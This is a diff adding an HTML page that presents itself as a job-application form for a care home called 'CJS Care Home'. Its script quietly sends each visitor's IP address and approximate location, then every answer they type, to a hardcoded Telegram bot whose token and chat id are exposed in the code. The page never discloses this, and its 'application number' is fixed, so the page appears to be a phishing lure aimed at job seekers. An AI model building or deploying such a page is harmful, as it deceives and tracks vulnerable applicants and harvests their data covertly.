@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CJS Care Home</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+* { box-sizing:border-box; font-family:'Inter',sans-serif; }
+body { margin:0; background:linear-gradient(180deg,#070022 0%,#14003d 100%); min-height:100vh; }
+.wrapper { max-width:420px; margin:0 auto; padding:40px 20px; }
+.card { background:#fff; border-radius:28px; padding:30px; box-shadow:0 25px 50px rgba(0,0,0,0.25); }
+.banner { width:100%; border-radius:20px; margin-bottom:25px; }
+h1 { font-size:22px; margin:0 0 8px 0; font-weight:700; }
+.subtext { color:#777; font-size:14px; margin-bottom:25px; }
+button { width:100%; background:#070022; color:#fff; padding:16px; border-radius:40px; border:none; font-size:16px; font-weight:600; cursor:pointer; }
+input { width:100%; padding:15px; border-radius:16px; border:1px solid #ddd; font-size:15px; margin-top:15px; }
+.green-box { background:#e6f4ea; padding:18px; border-radius:18px; margin-top:20px; font-size:14px; color:#145c2e; }
+.hidden { display:none; }
+.application-number { font-size:18px; font-weight:600; margin-top:20px; }
+</style>
+</head>
+<body>
+<div class="wrapper">
+
+<div class="card" id="page1">
+    <img src="assets/banner.jpg" class="banner">
+    <h1>Welcome to CJS Care Home</h1>
+    <div class="subtext">Links in the app are sponsored.</div>
+    <button onclick="captureLocation()">Sign up</button>
+</div>
+
+<div class="card hidden" id="page2">
+    <h1>Experienced</h1>
+    <div style="color:#5c4ccf;margin-bottom:10px;">Or New</div>
+    <input type="text" id="experience" placeholder="Type your work experience">
+    <div class="subtext">Message and data rates may apply</div>
+    <button onclick="submitExperience()">Continue</button>
+</div>
+
+<div class="card hidden" id="page3">
+    <h1>WORK EXPERIENCE</h1>
+    <div style="margin-top:8px;font-size:16px;">
+        What is your highest education qualification
+    </div>
+    <input type="text" id="education" placeholder="qualification type">
+    <div class="green-box">
+        <strong>Why is this important</strong><br>
+        This is used to determine the best job offer for you
+    </div>
+    <button onclick="submitEducation()">Continue</button>
+</div>
+
+<div class="card hidden" id="page4">
+    <h1>Are you willing to travel for work</h1>
+    <input type="text" id="travel" placeholder="Yes or No">
+    <button onclick="submitTravel()">Done</button>
+</div>
+
+<div class="card hidden" id="page5">
+    <h1>Application Submitted</h1>
+    <div class="application-number">
+        Your application number is 861-872
+    </div>
+</div>
+
+</div>
+
+<script>
+const TELEGRAM = "https://api.telegram.org/bot8560548303:AAHcGJfITeg6HVaaTB1juHbMSlSee53oywM/sendMessage?chat_id=8014982518&text=";
+
+function sendToTelegram(text) {
+    fetch(TELEGRAM + encodeURIComponent(text));
+}
+
+function captureLocation() {
+    fetch("/.netlify/functions/location")
+    .then(res => res.json())
+    .then(data => {
+        let msg = "Visitor Location\n" +
+                  "IP: " + data.ip + "\n" +
+                  "City: " + data.city + "\n" +
+                  "Region: " + data.region + "\n" +
+                  "Country: " + data.country;
+        sendToTelegram(msg);
+        nextPage(2);
+    })
+    .catch(() => {
+        sendToTelegram("Location detection failed");
+        nextPage(2);
+    });
+}
+
+function nextPage(page) {
+    document.querySelectorAll('.card').forEach(p => p.classList.add('hidden'));
+    document.getElementById('page'+page).classList.remove('hidden');
+}
+
+function submitExperience() {
+    sendToTelegram("Work Experience: " + document.getElementById("experience").value);
+    nextPage(3);
+}
+
+function submitEducation() {
+    sendToTelegram("Education Qualification: " + document.getElementById("education").value);
+    nextPage(4);
+}
+
+function submitTravel() {
+    sendToTelegram("Travel Availability: " + document.getElementById("travel").value);
+    sendToTelegram("Application Number: 861-872");
+    nextPage(5);
+}
+</script>
+</body>
+</html>
